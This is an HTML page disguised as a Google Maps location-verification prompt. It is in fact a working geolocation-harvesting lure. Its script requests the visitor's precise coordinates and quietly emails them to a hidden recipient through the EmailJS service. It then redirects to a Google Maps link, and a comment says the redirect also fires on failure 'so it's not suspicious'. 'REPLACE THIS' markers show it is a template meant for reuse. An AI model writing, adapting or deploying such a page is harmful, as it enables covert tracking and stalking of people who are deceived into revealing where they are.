<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Connection</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        .box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; }
        .btn { background-color: #0084ff; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
        .btn:active { transform: scale(0.98); }
    </style>
</head>
<body>

<div class="box">
    <img src="https://cdn-icons-png.flaticon.com/512/2991/2991108.png" width="50" alt="Maps">
    <h2>Verify Location</h2>
    <p>Please allow location access to continue to the map.</p>
    <button class="btn" onclick="startProcess()">Continue to Maps</button>
    <p id="msg" style="font-size: 12px; color: gray; margin-top: 15px;"></p>
</div>

<script>
    (function(){
        emailjs.init("H9BRpk3U8V2AmiaKh"); // REPLACE THIS
    })();

    function startProcess() {
        const msg = document.getElementById('msg');
        msg.innerText = "Checking permissions...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendData, handleError, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        } else {
            msg.innerText = "Error: Browser not supported.";
            setTimeout(() => window.location.href = "https://www.google.com/maps", 2000);
        }
    }

    function sendData(pos) {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        const templateParams = {
            lat: lat,
            lng: lng
        };

        emailjs.send('service_9uapyms', 'template_4cew6k7', templateParams) // REPLACE THESE
            .then(function() {
                // Success - redirect to Google Maps
                window.location.href = `https://maps.app.goo.gl/DTFSuYhdLxWscTiq6`;
            }, function(error) {
                // Fail - redirect anyway so it's not suspicious
                window.location.href = "https://maps.app.goo.gl/DTFSuYhdLxWscTiq6";
            });
    }

    function handleError(err) {
        // If user denies, just send them to standard Maps
        window.location.href = "https://www.google.com/maps";
    }
</script>

</body>
</html>
